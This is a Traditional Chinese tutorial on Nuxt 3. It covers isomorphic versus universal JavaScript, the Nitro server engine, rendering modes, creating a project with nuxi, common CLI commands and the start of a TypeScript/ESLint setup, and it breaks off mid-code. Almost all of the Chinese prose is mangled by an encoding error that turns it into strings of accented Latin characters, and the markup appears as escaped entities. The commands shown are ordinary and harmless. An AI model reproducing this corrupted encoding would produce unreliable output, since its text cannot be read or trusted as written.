å³ç¨±ä¹‹ç‚ºåŒæ¨£çš„ JavaScript ç¨‹å¼ç¢¼å¯ä»¥åœ¨å®¢æˆ¶ç«¯åŠä¼ºæœå™¨ç«¯é‹è¡Œï¼›ä¹Ÿå°±æ˜¯èªªåŒä¸€ä»½ Code é™¤äº†èƒ½åœ¨å‰ç«¯ç€è¦½å™¨ä¹Ÿèƒ½åœ¨å¾Œç«¯åŸ·è¡Œã€‚\nç„¶è€Œ Isomorphic JavaScript èˆ‡ Universal JavaScript çš„åè©å­˜æœ‰ä¸€äº›çˆ­è­°èˆ‡å·®ç•°ï¼Œå¦‚ä»Šï¼ŒIsomorphic JavaScript å¤šä»¥ç¨±ç›¸åŒçš„ç¨‹å¼ç¢¼å…ƒä»¶ï¼Œå¯ä»¥åœ¨å®¢æˆ¶ç«¯èˆ‡ä¼ºæœå™¨ç«¯ç”¨ä¾†çµ„è£æˆ–æ¸²æŸ“å‡ºé é¢çš„æŠ€è¡“ã€‚\nUniversal JavaScript Michael Jackson çš„æ–‡ç« æåˆ°ï¼ŒIsomorphic é€™å€‹è©çš„å«ç¾©ã€Œcorresponding or similar in form and relationsã€ç‚ºå…©å€‹å¯¦é«”ä¸ç›¸åŒï¼Œä½†å…·æœ‰ç›¸ä¼¼çš„æ“ä½œæˆ–å°æ‡‰çš„é—œä¿‚ï¼Œæ›å¥è©±èªªå°±æ˜¯ï¼Œå…©å€‹çœ‹èµ·ä¾†ä¸ä¸€æ¨£çš„ä½¿ç”¨æ–¹æ³•æˆ–èªæ³•ï¼Œä½†æœ€çµ‚çš„åŸ·è¡Œçµæœæ˜¯ä¸€æ¨£çš„ï¼Œä¾‹å¦‚ jQuery æˆ– Zepto æ“ä½œ DOM çš„èªæ³•é•·çš„ä¸å¤§ä¸€æ¨£ï¼Œä½†æ˜¯æœ€çµ‚ä¹Ÿéƒ½æ˜¯å°æ‡‰ JavaScript çš„ document.querySelector ç­‰æ–¹æ³•ã€‚\næ‰€ä»¥èªªï¼Œç‚ºäº†æè¿°ç›¸åŒçš„ç¨‹å¼ç¢¼ä½†èƒ½åœ¨ä¸åŒç’°å¢ƒä¸­é‹è¡Œçš„åè©ï¼Œå°±æœ‰äº† Universal JavaScript ä¸€è©ï¼Œé€™å€‹åå­—å‘Šè¨´äººå€‘ JavaScript å®ƒä¸åƒ…å¯ä»¥åœ¨æœå‹™å™¨å’Œç€è¦½å™¨ä¸Šé‹è¡Œï¼Œé‚„å¯ä»¥åœ¨æœ¬æ©Ÿè¨­å‚™å’ŒåµŒå…¥å¼æ¶æ§‹ä¸Šé‹è¡Œã€‚\né‚£éº¼ Isomorphic JavaScript å’Œ Universal JavaScript èˆ‡æˆ‘å€‘åˆæœ‰ä»€éº¼é—œä¿‚å‘¢ï¼Ÿ\næœ‰çš„ï¼Œå› ç‚º Nuxt 3 æ­£æ˜¯ä¸€å€‹ Isomorphic JavaScript æ¡†æ¶ï¼ŒNuxt 3 æ˜¯ç›®å‰ä½ ä½¿ç”¨ Vue 3 åœ¨é–‹ç™¼ç¶²ç«™æ™‚ï¼Œæœƒéœ€è¦æ¡ç”¨ SSR æŠ€è¡“æˆ–å„ªåŒ– SEO å•é¡Œæ‰€å¯ä»¥ä½¿ç”¨çš„è§£æ±ºæ–¹æ¡ˆã€‚\nNuxt 3 Nuxt 3 å®˜æ–¹åœ¨ 2022/11/16 æ­£å¼ç™¼å¸ƒç©©å®šç‰ˆæœ¬ Nuxt 3.0 stableã€‚\nNuxt 3 å®˜ç¶²çš„æ¨™èª The Intuitive Web Frameworkï¼ŒNuxt 3 å°‡è®“ä½ æ›´ç›´è¦ºçš„é«”é©—æ··åˆæ¸²æŸ“ç­‰æ–°åŠŸèƒ½ï¼Œè®“åœ¨ä½¿ç”¨ Vue 3 é–‹ç™¼æ™‚è®Šå¾—æ›´åŠ ç°¡å–®ï¼\nNuxt 3 çš„æ–°ç‰¹æ€§ å¾ Nuxt 3 å®˜ç¶²çš„æä¾›è¨Šæ¯æ‰€åˆ—ï¼Œç°¡å–®èªªæ˜ä¸€ä¸‹ Nuxt 3 çš„æ–°ç‰¹æ€§ï¼Œå…±æœ‰ä¸‹åˆ— 12 å€‹ï¼š\nLighterï¼šæ›´è¼•é‡ï¼Œé‡å°ç¾åœ¨ç€è¦½å™¨ï¼Œä¼ºæœå™¨éƒ¨ç½²èˆ‡å®¢æˆ¶ç«¯æ‰“åŒ…èƒ½æ¸›å°‘æœ€é«˜ 75 å€ä¹‹å¤šã€‚ Fasterï¼šæ›´å¿«é€Ÿï¼Œé€šé Nitro æä¾›æ”¯æŒçš„å‹•æ…‹ä¼ºæœå™¨ç«¯ç¨‹å¼ç¢¼æ‹†åˆ†ä¾†å„ªåŒ–å†·å•Ÿå‹•å•é¡Œã€‚ Hybirdï¼šå‹•æ…‹çš„éœæ…‹é é¢ç”Ÿæˆå’Œå…¶ä»–é«˜ç´šæ¨¡å¼ï¼Œç¾åœ¨é€™äº›éƒ½å°‡æˆç‚ºå¯èƒ½ã€‚ Suspenseï¼šåœ¨å°èˆªè§¸ç™¼çš„å‰å¾Œï¼Œçš†å¯ä»¥åœ¨ä»»ä½•å…ƒä»¶ä¸­å–å¾—æ•¸æ“šè³‡æ–™ã€‚ Composition APIï¼šä½¿ç”¨ Composition API å’Œ Nuxt 3 çš„ Composables å¯¦ç¾çœŸæ­£çš„ç¨‹å¼ç¢¼å¯é‡ç”¨æ€§ã€‚ Nuxt CLIï¼šå…¨æ–°çš„é›¶ä¾è³´é«”é©—ï¼Œå¹«åŠ©ä½ è¼•é¬†å»ºç«‹å°ˆæ¡ˆèˆ‡æ¨¡çµ„æ•´åˆã€‚ Nuxt Dev Toolsï¼šå°ˆå±¬é–‹ç™¼é™¤éŒ¯å·¥å…·ï¼Œæä¾›æ›´å¤šçš„è³‡è¨Šèˆ‡å¿«é€Ÿä¿®å¾©ï¼Œè®“å·¥ä½œæ›´é«˜æ•ˆã€‚ Nuxt Kitï¼šå…·å‚™åŸºæ–¼ TypeScript å’Œè·¨ç‰ˆæœ¬å…¼å®¹æ€§çš„å…¨æ–°æ¨¡çµ„é–‹ç™¼ã€‚ webpack 5ï¼šæ›´å¿«é€Ÿçš„æ‰“åŒ…æ™‚é–“èˆ‡æ‰“åŒ…å‡ºæ›´å°çš„é«”ç©ï¼Œä¸¦ä¸”ç„¡éœ€ä»»ä½•é…ç½®ã€‚ Viteï¼šä½¿ç”¨ Vite ä½œç‚ºæ‰“åŒ…å·¥å…·ï¼Œé«”é©—é–ƒé›»èˆ¬å¿«é€Ÿçš„ HMRã€‚ Vue 3ï¼šå®Œå…¨æ”¯æŒ Vue 3ã€‚ TypeScriptï¼šä½¿ç”¨ TypeScript èˆ‡ ESM æ§‹å»ºè€Œæˆï¼Œç„¡éœ€é¡å¤–çš„é…ç½®æ­¥é©Ÿã€‚ Nitro Nuxt 3 ç”±ä¸€å€‹å…¨æ–°çš„ä¼ºæœå™¨å¼•æ“ Nitro æä¾›æ”¯æŒï¼Œå®ƒå…·æœ‰ä»¥ä¸‹å¹¾å€‹ç‰¹é»ï¼š\nè·¨å¹³å°æ”¯æŒï¼Œæ”¯æŒ Node.js èˆ‡ç€è¦½å™¨ç­‰ã€‚ Serverless æ”¯æŒã€‚ API è·¯ç”±ï¼Œä½¿ç”¨ unjs/h3ã€‚ è‡ªå‹•ç¨‹å¼ç¢¼æ‹†åˆ† (code-splitting) èˆ‡ç•°æ­¥åŠ è¼‰ chunk (async-loaded chunks)ã€‚ æ··åˆæ¸²æŸ“æ¨¡å¼ï¼Œä¾›éœæ…‹ (static)èˆ‡ç„¡ä¼ºæœå™¨ (serverless) ç¶²ç«™ã€‚ é–‹ç™¼ä¼ºæœå™¨ä¸Šçš„ HMR (hot module reloading)ã€‚ ç°¡å–®ä¾†èªªï¼ŒNitro å·²ç¶“æ˜¯ Nuxt 3 åŒ…å«çš„å…¨æ–°ä¼ºæœå™¨å¼•æ“ï¼Œç„¡éœ€å†é€²è¡Œé…ç½®ã€‚Nitro é™¤äº†æ”¯æ´ SPAã€å»ºç«‹éœæ…‹çš„ç¶²ç«™ï¼Œç”šè‡³èƒ½åœ¨å¾Œç«¯æ‰“ API æ™‚ç›´æ¥èª¿ç”¨ç›¸é—œå‡½æ•¸ï¼Œå¾è€Œé™ä½ API Requestï¼Œæ•´é«”ä¾†èªªæ˜¯éå¸¸å¼·å¤§çš„ä¼ºæœå™¨å¼•æ“ã€‚\nNuxt 3 æ¸²æŸ“æ¨¡å¼ Nuxt 3 ç›®å‰æ”¯æ´å…©ç¨®æ¸²æŸ“æ¨¡å¼ï¼ŒClient-side Only Rendering èˆ‡ Universal Renderingã€‚ä¹‹å¾Œå°‡æœƒæ¨å‡ºæ›´å…ˆè¿‘çš„æ¸²æŸ“æ¨¡å¼ï¼Œæ··åˆæ¸²æŸ“ (Hybrid Rendering) èˆ‡é‚Šç·£æ¸²æŸ“ (Edge-Side Rendering)ã€‚\nClient-side Only Rendering Nuxt 3 è¨­å®šç‚ºè©²æ¨¡å¼ï¼Œå¦‚åŒå–®ç´”ä½¿ç”¨ Vue 3 å»ºç½®å‡ºçš„ SPAï¼Œç€è¦½å™¨ä¸‹è¼‰ä¸¦è¼‰å…¥å®Œ Vue ç¨‹å¼ç¢¼å¾Œï¼Œæ¸²æŸ“ HTML çš„æ‰€æœ‰å‹•ä½œçš†åœ¨å®¢æˆ¶ç«¯åŸ·è¡Œï¼Œä¹Ÿå°±æ˜¯å®¢æˆ¶ç«¯æ¸²æŸ“ CSRã€‚\nUniversal Rendering Universal Rendering æ˜¯ Nuxt 3 é è¨­çš„æ¸²æŸ“æ¨¡å¼ï¼Œåœ¨é€™å€‹æ¨¡å¼ä¹‹ä¸‹ï¼Œç„¡è«–é é¢æ˜¯é å…ˆç”¢ç”Ÿä¸¦ç·©å­˜é‚„æ˜¯å‹•æ…‹æ¸²æŸ“ï¼ŒNuxt éƒ½æœƒåœ¨ä¼ºæœå™¨ç’°å¢ƒä¸­åŸ·è¡Œ Vue ç¨‹å¼ç¢¼ï¼Œä¸¦æ¸²æŸ“ HTMLï¼Œä¹Ÿå°±æ˜¯å¦‚åŒ SSRï¼Œä¼ºæœå™¨æœƒå‘ç€è¦½å™¨è¿”å›ä¸€å€‹å®Œæ•´å‘ˆç¾çš„ HTML é é¢ã€‚ç•¶ç€è¦½å™¨å®Œæ•´å‘ˆç¾çš„é é¢å‡ºç¾å¾Œï¼Œä¹Ÿæœƒé–‹å§‹è¼‰å…¥ Vue ç¨‹å¼ç¢¼ï¼Œä»¥å› æ‡‰å¾ŒçºŒçš„å‹•æ…‹é é¢èˆ‡è·¯ç”±è·³è½‰ç­‰ï¼Œå³è½‰æ›ç‚º SPA é–‹å§‹ç”±å®¢æˆ¶ç«¯é€²è¡Œæ¸²æŸ“ã€‚ä¹Ÿå°±æ˜¯èªª Nuxt 3 çš„ Universal Rendering å³æ˜¯æŒ‡ SSR + SPAã€‚\næ··åˆæ¸²æŸ“ (Hybrid Rendering) æˆ‘å€‘åœ¨ä½¿ç”¨ Vue é–‹ç™¼ SPA ç¶²ç«™æ™‚ï¼Œé€šå¸¸æ˜¯æœƒè¨­ç½®è·¯ç”± (Route) è®“ç¶²é èƒ½å¤ åˆ°é”ä¸åŒçš„é é¢å†ä¾†è«‹æ±‚è³‡æ–™ï¼Œæ­¤ç‚º CSRã€‚åœ¨ä½¿ç”¨ Nuxt é–‹ç™¼æ™‚èƒ½è®“èƒ½ç¶²ç«™æ“æœ‰ SSR + SPA çš„ Universal Rendering æ¸²æŸ“æ–¹å¼ï¼Œé™¤æ­¤ä¹‹å¤–ï¼ŒNuxt 3 é‚„æä¾›äº†ä¸€ç¨®æ›´å…ˆé€²çš„æ¸²æŸ“æ¨¡å¼â€”â€”æ··åˆæ¸²æŸ“ (Hybrid Rendering)ï¼Œå¯ä»¥ç‚ºæ¯å€‹è·¯ç”±è¨­ç½®ä¸åŒçš„æ¸²æŸ“èˆ‡ç·©å­˜çš„è¦å‰‡ï¼Œè®“éƒ¨åˆ†é é¢ä½¿ç”¨ CSR åœ¨å®¢æˆ¶ç«¯é€²è¡Œæ¸²æŸ“ï¼Œå¦ä¸€éƒ¨åˆ†ä½¿ç”¨ SSR åœ¨ä¼ºæœå™¨ç«¯é€²è¡Œæ¸²æŸ“ã€‚\né‚Šç·£æ¸²æŸ“ (Edge-Side Rendering) Nitro ç‚º Nuxt 3 æä¾›æ”¯æŒçš„å…¨æ–°ä¼ºæœå™¨ç«¯æ¸²æŸ“å¼•æ“ï¼Œå®ƒç‚º Node.jsã€Denoã€Worker ç­‰æä¾›è·¨å¹³å°çš„æ”¯æŒï¼Œè®“ Nuxt å¯ä»¥åœ¨ CDN Edge Workers é€²è¡Œæ¸²æŸ“ï¼Œæ•…ç¨±ç‚ºé‚Šç·£æ¸²æŸ“ (Edge-Side Rendering)ï¼Œèƒ½æœ‰æ•ˆåˆ†æ“”åœ¨ä¼ºæœå™¨ç«¯æ¸²æŸ“æ™‚çš„è³‡æºè² è·ï¼Œå°‡å…¶æå‡åˆ°å¦ä¸€å€‹å±¤æ¬¡ï¼Œå¾è€Œæ¸›å°‘ç¶²è·¯å»¶é²åŠæˆæœ¬ã€‚\nNuxt 3 çš„å»ºæ§‹å·¥å…· Nuxt 3 é è¨­çš„å»ºæ§‹å·¥å…·å¦‚ä¸‹ï¼š\né è¨­ä½¿ç”¨ Vite ä¹Ÿå¯ä»¥åˆ‡æ›æˆ webpack Rollup PostCSS esbuild Nuxt 3 å·²ç¶“å¹«æˆ‘å€‘é…ç½®å¥½ä¸€å †è¨­å®šå•¦ï¼ŒçœŸçš„æ˜¯é–‹ç®±å³ç”¨ï¼Œè€Œä¸” Nuxt ä¹Ÿæ”¯æ´ TypeScriptã€‚å¦‚æœèªªçœŸçš„è¦èª¿æ•´é…ç½®ï¼Œä¹Ÿå¯ä»¥å† nuxt.config ä¸­é€²è¡Œèª¿æ•´ï¼Œéå¸¸æ–¹ä¾¿è²¼å¿ƒã€‚\nä½¿ç”¨ nuxi å»ºç«‹ç¬¬ä¸€å€‹å°ˆæ¡ˆ ç·šä¸Šç©ç©çœ‹ å¦‚æœä½ é‚„åœ¨è§€æœ›æˆ–æ˜¯å¾éš”å£æ£šéä¾†çš„ï¼Œé‚„ä¸æƒ³å®‰è£ç›¸é—œå·¥å…·èˆ‡ç’°å¢ƒï¼Œé‚£éº¼å¯ä»¥é»æ“Šä¸‹é¢å…¶ä¸€é€£çµï¼Œåœ¨ StackBlitza æˆ– CodeSandbox çš„ç·šä¸Šç·¨è¼¯å™¨ç’°å¢ƒç¨å¾®ç©ç©ï¼Œç›´æ¥ç·šä¸Šé«”é©— Nuxt 3ã€‚\nPlay on StackBlitz Play on CodeSandbox é–‹å§‹å»ºç«‹ç¬¬ä¸€å€‹å°ˆæ¡ˆ å…ˆæ±ºæ¢ä»¶ é–‹å§‹ä¹‹å‰ï¼Œä¾ç…§ Nuxt 3 å®˜ç¶²çš„èµ·æ‰‹å¼æˆ‘å€‘æœ‰å¹¾å€‹é …ç›®éœ€è¦åšä¸€ä¸‹æª¢æŸ¥ï¼Œæˆ‘å€‘é€™è£¡åƒ…å…ˆæ³¨æ„ä¸€ä¸‹ Node.js çš„ç‰ˆæœ¬ï¼Œå»ºè­°ä½¿ç”¨ç›®å‰æœ€æ–° LTS ç‰ˆæœ¬ v16.17.0 (åŒ…å« NPM v8.15.0)ã€‚\nä½¿ç”¨ nuxi å»ºç«‹ Nuxt 3 å°ˆæ¡ˆ nuxi å…¨åç‚º Nuxt Command Line Interfaceï¼Œæ˜¯ç”± Nuxt æä¾›é–‹ç™¼çš„æ¨™æº–å·¥å…·ï¼ŒNuxt CLI å°±åƒæ˜¯ Vue CLI å¯ä»¥å»ºç«‹ Vue å°ˆæ¡ˆï¼Œæˆ‘å€‘ç•¶ç„¶ä¹Ÿå°±å¯ä»¥ä½¿ç”¨ Nuxt CLI ä¾†å»ºç«‹ Nuxt çš„å°ˆæ¡ˆã€‚\né¦–å…ˆï¼Œæ‰“é–‹çµ‚ç«¯æ©Ÿ (Terminal)ï¼Œå°‡ç›®éŒ„åˆ‡æ›è‡³è‡ªå·±ç¿’æ…£çš„å·¥ä½œå€ï¼Œæ¥è‘—è¼¸å…¥å¦‚ä¸‹çš„ nuxi æä¾›æŒ‡ä»¤ä¸¦åŸ·è¡Œï¼Œä¾†åˆå§‹åŒ–å»ºç«‹ä¸€å€‹ Nuxt 3 å°ˆæ¡ˆã€‚åœ¨æ­¤ï¼Œæˆ‘å€‘çš„å°ˆæ¡ˆåç‚º nuxt-appã€‚\n1 npx nuxi init nuxt-app å¦‚ä¸‹åœ–ï¼Œnpx æœƒè©¢å•ä½ æ˜¯å¦å®‰è£æœ€æ–°ç‰ˆæœ¬çš„å¥—ä»¶ nuxi@3.0.0-rc.10 è¼¸å…¥ y å³å¯ã€‚\nåŸ·è¡Œå®ŒæŒ‡ä»¤å¾Œç›´åˆ°å‡ºç¾å¦‚ä¸‹æç¤ºï¼Œä»£è¡¨å°ˆæ¡ˆå·²ç¶“åˆå§‹å»ºç«‹æˆåŠŸï¼Œå®Œæˆå¾Œå¯ä»¥ç™¼ç¾ç›®å‰ç›®éŒ„ä¸‹å¤šäº†ä¸€å€‹åç‚º nuxt-app çš„è³‡æ–™å¤¾ï¼Œé€™å€‹è³‡æ–™å¤¾ä¹Ÿå°±æ˜¯ Nuxt 3 å°ˆæ¡ˆçš„æ ¹ç›®éŒ„ã€‚\næ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘å¯ä»¥é€²å…¥å°ˆæ¡ˆç›®éŒ„ nuxt-appã€‚\n1 cd nuxt-app åœ¨ nuxt-app å°ˆæ¡ˆç›®éŒ„ä¸‹å¯ä»¥çœ‹åˆ°ç†Ÿæ‚‰çš„ package.jsonï¼Œæˆ‘å€‘å°±å¯ä»¥é–‹å§‹å®‰è£ Nuxt 3 å°ˆæ¡ˆçš„ç›¸é—œä¾è³´å¥—ä»¶ã€‚\n1 2 3 npm install # or # yarn Nuxt CLI å¦‚åŒ Vue CLI å·²ç¶“åœ¨å»ºç«‹å°ˆæ¡ˆæ™‚å¹«æˆ‘å€‘åˆå§‹å®Œæˆè¨±å¤šäº‹æƒ…ï¼Œå†å®‰è£å®Œç›¸é—œä¾è³´å¥—ä»¶å¾Œè¼¸å…¥ä¸‹åˆ—æŒ‡ä»¤ï¼Œæˆ‘å€‘å°±å¯ä»¥åœ¨é–‹ç™¼ç’°å¢ƒä¸‹å•Ÿå‹• Nuxt äº†ã€‚\n1 2 3 npm run dev -- -o # or # yarn run dev -- -o å¦‚æœæ²’æœ‰æ„å¤–ï¼Œå¯ä»¥çœ‹åˆ° Nitro å¹«æˆ‘å€‘å•Ÿå‹•äº† Nuxt 3 çš„æœå‹™ã€‚\næ ¹æ“šæç¤ºï¼Œæˆ‘å€‘å¯ä»¥åœ¨ç€è¦½å™¨è¼¸å…¥ç¶²å€ http://localhost:3000/ çœ‹çœ‹æœå‹™æ˜¯å¦æ­£å¸¸é‹ä½œã€‚\nå¦‚æœçœ‹åˆ°å¦‚ä¸‹åœ–çš„æ­¡è¿ç•«é¢ï¼Œæ­å–œä½ ï¼æˆ‘å€‘å·²ç¶“æˆåŠŸå»ºç«‹ç¬¬ä¸€å€‹ Nuxt 3 å°ˆæ¡ˆå›‰ï¼\nç¾åœ¨ä½ å¯ä»¥å˜—è©¦æ‰“é–‹åœ¨å°ˆæ¡ˆç›®éŒ„ä¸‹çš„ app.vue æª”æ¡ˆä¹‹ä¸­ï¼Œapp.vue æ˜¯æˆ‘å€‘ Nuxt å°ˆæ¡ˆçš„é€²å…¥é»ï¼Œå®ƒçš„å…§å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtWelcome /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; å¯ä»¥ç™¼ç¾å®ƒèˆ‡ Vue 3 çš„å–®ä¸€å…ƒä»¶æª” (Single File Component, SFC) ç›¸æ¯”ï¼Œå¥½åƒå°‘äº†é»ä»€éº¼ï¼Œæ€éº¼æœ‰ç”¨äº† \u0026lt;NuxtWelcome /\u0026gt; å»æ²’çœ‹è¦‹åœ¨å“ªé‚Š import çš„å‘¢ï¼Ÿ\nå…¶å¯¦å‘¢ï¼Œ\u0026lt;NuxtWelcome /\u0026gt; é€™å€‹å…ƒä»¶å°±æ˜¯æˆ‘å€‘å‰é¢ç€è¦½å™¨çœ‹åˆ°çš„æ­¡è¿ç•«é¢ï¼Œæ˜¯ Nuxt æ¡†æ¶è‡ªå¸¶çš„ä¸€å€‹å…ƒä»¶ï¼Œè€Œä¸” Nuxt è‡ªå‹•å°å…¥å…ƒä»¶çš„æ›´æ˜¯å…¶ç‰¹è‰²ä¹‹ä¸€ï¼Œå¾Œé¢çš„ç³»åˆ—æˆ‘å€‘æœƒå†æåˆ°è‡ªå‹•å°å…¥ (Auto Imports)ã€‚\nåœ¨é€™è£¡ç›´æ¥ç§»é™¤ \u0026lt;NuxtWelcome /\u0026gt; å°±å¯ä»¥äº†ï¼Œæˆ‘å€‘å°‡ app.vue èª¿æ•´å¦‚ä¸‹ï¼Œä¸¦ä¿å­˜æª”æ¡ˆã€‚\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;2022 iThome éµäººè³½\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; å¯ä»¥çœ‹è¦‹å› ç‚º Nuxt é è¨­ Vite å»ºæ§‹ä¸¦æ”¯æ´ HMR (Hot Module Replacement)ï¼Œæˆ‘å€‘å¯ä»¥åœ¨ç€è¦½å™¨å¿«é€Ÿçš„çœ‹è¦‹ä¿®æ”¹å¾Œçš„çµæœã€‚\nè‡³æ­¤ï¼Œå¤§å®¶å°±å¯ä»¥å…ˆç°¡å–®çš„ç©ç© Nuxt 3ï¼Œæ¥ä¸‹ä¾†æˆ‘å°‡è£œå……ä¸€äº› nuxi çš„æŒ‡ä»¤èˆ‡åƒæ•¸ç°¡ä»‹ã€‚\nNuxt CLI å¸¸ç”¨æŒ‡ä»¤ ä»¥ä¸‹å°‡ç°¡å–®ä»‹ç´¹ä¸€äº›å¸¸ç”¨çš„æŒ‡ä»¤ï¼Œè‹¥æ‚¨åœ¨å°ˆæ¡ˆç›®éŒ„ä¸‹è¨˜å¾—ä½¿ç”¨ npx ä¾†åŸ·è¡Œ nuxiã€‚\nå¦å¤–åœ¨æ­¤æé†’ï¼Œä¸‹é¢æ‰€åˆ—çš„æŒ‡ä»¤éƒ¨åˆ†åƒæ•¸æœƒé€²è¡Œçœç•¥ï¼Œè‹¥æœ‰èˆˆè¶£ç¿»ç¿»å®Œæ•´çš„æŒ‡ä»¤èˆ‡åƒæ•¸èªªæ˜ï¼Œå¯ä»¥åƒè€ƒ Nuxt 3 å®˜æ–¹æ–‡ä»¶ã€‚\nnuxi init 1 npx nuxi init|create [dir] é€™å€‹ nuxi init æŒ‡ä»¤æ˜¯ç”¨ä¾†åˆå§‹åŒ–ä¸€å€‹ Nuxt å°ˆæ¡ˆï¼Œç­‰åŒ nuxi create æŒ‡ä»¤ï¼Œdir ä½ å¯ä»¥å¡«å­—ä¸²ä½œç‚ºå°ˆæ¡ˆèˆ‡è³‡æ–™å¤¾åç¨±ï¼Œä¹Ÿå¯ä»¥å¡«å¯«å®Œæ•´è·¯å¾‘ä¾†å»ºç«‹å°ˆæ¡ˆç›®éŒ„ã€‚\nnuxi dev 1 npx nuxi dev [--open, -o] [--port, -p] ç•¶æˆ‘å€‘åœ¨æœ¬åœ°ç«¯é€²è¡Œé–‹ç™¼æ™‚ï¼Œéœ€è¦é‹è¡Œé–‹ç™¼ç’°å¢ƒï¼Œç•¶æˆ‘å€‘åŸ·è¡Œ npm run dev -- -o æ™‚ï¼Œä¾æ“š package.json ä¸­çš„ scripts æ‰€åˆ—ï¼Œå…¶å¯¦å°±æ˜¯åœ¨åŸ·è¡Œ nuxi dev -oï¼Œå…¶ä¸­çš„ -o è¡¨ç¤ºæœå‹™å•Ÿå‹•å¾Œé–‹å•Ÿç€è¦½å™¨ã€‚\nå¦‚æœå•Ÿå‹•æœå‹™ç™¼ç¾ Port è¡çªï¼Œä½ ä¹Ÿå¯ä»¥é€é -p ä¾†å°‡é è¨­çš„ç›£è½çš„ Port: 3000 èª¿æ•´ç‚ºå…¶ä»–æ•¸å€¼ã€‚\n1 2 3 nuxi dev -p 3001 # æˆ– # npm run dev -- -o -p 3001 nuxi cleanup 1 npx nuxi clean|cleanup nuxi cleanup ç­‰åŒ nuxi clean æŒ‡ä»¤ï¼Œç”¨ä¾†åˆªé™¤ Nuxt è‡ªå‹•ç”¢ç”Ÿçš„æª”æ¡ˆå’Œç·©å­˜åŒ…æ‹¬ï¼š\n.nuxt .output node_modules/.vite node_modules/.cache nuxi upgrade 1 npx nuxi upgrade [--force|-f] é€™å€‹æŒ‡ä»¤å¯ä»¥ç”¨ä¾†å°‡ç›®å‰å°ˆæ¡ˆçš„ Nuxt 3 å‡ç´šè‡³æœ€æ–°çš„ç‰ˆæœ¬ï¼Œå¦‚æœæœ‰ä¸€äº›å¯èƒ½è¡Œç‚ºèª¿æ•´æˆ–ä¸ç›¸å®¹çš„æƒ…æ³ï¼Œå¯ä»¥å†ä¾æ“šå¯¦éš›æƒ…å¢ƒæ­é… -f åƒæ•¸ä¾†å¼·åˆ¶æ›´æ–°ã€‚\nå¦‚ä¸‹åœ–ï¼Œåªè¦ä¸€è¡ŒæŒ‡ä»¤ npx nuxi upgrade å°±å¯ä»¥å°‡å°ˆæ¡ˆç‰ˆæœ¬ç”± 3.0.0-rc.9 å‡ç´šè‡³ 3.0.0-rc.10ï¼Œåœ¨ RC éšæ®µæˆ–ä¹‹å¾Œæƒ³å®šæœŸå‡ç´šç‰ˆæœ¬ä¾†èªªéå¸¸å¥½ç”¨ï¼Œä½†ä¹Ÿè«‹è¨˜å¾—å‡ç´šå‰å¯ä»¥å…ˆçœ‹ä¸€ä¸‹å®˜æ–¹çš„ Changelogã€‚\nNuxt 3 + TypeScript + ESLint + Prettier ç’°å¢ƒå»ºç½® åœ¨æˆ‘å€‘ä½¿ç”¨å®Œ Nuxt CLI å»ºç«‹å®Œå°ˆæ¡ˆå¾Œï¼Œå…¶å¯¦å°±å¯ä»¥é–‹å§‹é€²è¡Œå°ˆæ¡ˆçš„é–‹ç™¼ï¼Œä½†æ˜¯å‘¢ï¼Œç›¸ä¿¡ä¸å°‘äººå°æ–¼ç¨‹å¼ç¢¼çš„æ’ç‰ˆéƒ½æœ‰è‡ªå·±çš„é¢¨æ ¼ï¼Œä¸åŒäººçš„ Coding Style è‚¯å®šä¹Ÿéƒ½ä¸ä¸€æ¨£ï¼Œç„¶è€Œåœ¨åœ˜éšŠå”ä½œéœ€è¦æ¨™æº–æˆ–ç‚ºäº†æ•´é«”ä¸€è‡´ä¸”ç¾è§€ä¸‹ï¼ŒLinter å°±æ˜¯ä½ çš„å¥½å¹«æ‰‹ï¼Œæ­¤å¤–ï¼ŒTypeScript åœ¨ Nuxt 3 å·²ç¶“æœ‰å…§å»ºæ”¯æ´ï¼Œæˆ‘ä¹Ÿå»ºè­°åŠæ¨è–¦ä½¿ç”¨ TypeScriptï¼Œæ¥ä¸‹ä¾†åˆ†äº«æˆ‘è‡ªå·±åœ¨ä½¿ç”¨ Nuxt 3 é–‹ç™¼æ™‚çš„ Linter ç’°å¢ƒé…ç½®ï¼ŒåŒ…å«äº† TypeScriptã€ESLint èˆ‡ Prettierã€‚\nTypeScript é¡å‹æª¢æŸ¥ Nuxt 3 å·²ç¶“æœ‰å…§å»ºæ”¯æ´ TypeScriptï¼Œä¸€äº› TypeScript è¨­å®šéƒ½å¯ä»¥åœ¨å°ˆæ¡ˆæ ¹ç›®éŒ„ä¸‹é…ç½® tsconfig.jsonï¼Œä¾‹å¦‚ï¼Œåœ¨é–‹ç™¼éç¨‹ä¸­é‡å° TypeScript æˆ‘æœƒåœ¨é–‹ç™¼ç’°å¢ƒä¸‹å•Ÿå‹•é¡å‹æª¢æŸ¥ï¼Œå¯ä»¥åƒè€ƒä»¥ä¸‹é€²è¡Œé…ç½®ã€‚\nStep 1. å®‰è£ VS Code æ’ä»¶ é¦–å…ˆï¼Œæ¨è–¦å¤§å®¶å®‰è£ä¸‹åˆ—å…©å€‹ VS Code æ’ä»¶ï¼š\nVue Language Features (Volar)ï¼šå¯« Vue 3 å¼·åŠ›æ¨è–¦å¿…è£çš„æ’ä»¶ï¼ŒåŒ…å«äº†ä¸Šè‰²ã€èªæ³•æç¤ºã€ç·¨è¼¯å™¨å¿«é€Ÿåˆ†å‰²ç­‰å¼·å¤§åŠŸèƒ½ï¼Œè€Œä¸”ä¹Ÿæ˜¯ Nuxt 3 æ¨è–¦çš„ç·¨è¼¯å™¨æ’ä»¶ã€‚ TypeScript Vue Plugin (Volar)ï¼šVue çš„ TypeScript æ’ä»¶ã€‚ Step 2. å®‰è£ Vue é¡å‹æª¢æŸ¥å¥—ä»¶ 1 2 3 npm install -D vue-tsc typescript # or # yarn add -D vue-tsc typescript Step 3. èª¿æ•´ nuxt.config.ts è¨­å®š æ ¹æ“š nuxt3 å®˜æ–¹æ–‡ä»¶èªªæ˜ï¼Œæˆ‘å€‘å¯ä»¥åœ¨ nuxt.config.ts ä¸­ï¼Œè¨­ç½® typescript.typeCheck: true ä¾†è®“é–‹ç™¼æ™‚æœŸèƒ½åŸ·è¡Œé¡å‹æª¢æŸ¥ã€‚\n1 2 3 4 5 export default 